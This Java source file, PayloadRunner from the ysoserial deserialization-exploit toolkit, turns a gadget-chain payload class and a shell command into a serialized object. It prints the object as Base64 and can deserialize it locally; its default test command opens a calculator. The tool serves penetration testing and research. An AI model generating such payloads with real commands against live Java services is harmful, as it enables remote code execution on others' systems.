package ysoserial.payloads.util;

import java.io.File;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.Callable;

import ysoserial.Deserializer;
import ysoserial.Serializer;

import static ysoserial.Deserializer.deserialize;
import static ysoserial.Serializer.serialize;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.secmgr.ExecCheckingSecurityManager;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static boolean runDeserialize = false;

    public static boolean printBase64payload = true;
    public static boolean printUrlEncodeBase64payload = false;

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args)
        throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String[] command =
                    args.length > 0 && args[0] != null ? args : new String[] {getDefaultTestCmd()};

//                System.out.println("generating payload object(s) for command: '" + Arrays.toString(command) + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

//                System.out.println("serializing payload");
                byte[] ser = objBefore instanceof byte[] ? (byte[]) objBefore : Serializer.serialize(objBefore);
                Utils.releasePayload(payload, objBefore);
                if (printBase64payload) {
                    String base64 = Base64.getEncoder().encodeToString(ser);
                    System.out.println(base64);
                    if (printUrlEncodeBase64payload) {
                        System.out.println(URLEncoder.encode(base64));
                    }
                }
                return ser;
            }
        });

        if (runDeserialize) {
            try {
                System.out.println("deserializing payload");
                final Object objAfter = Deserializer.deserialize(serialized);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    private static String getDefaultTestCmd() {
        return getFirstExistingFile(
            "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String... files) {
//        return "calc.exe";
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }
}
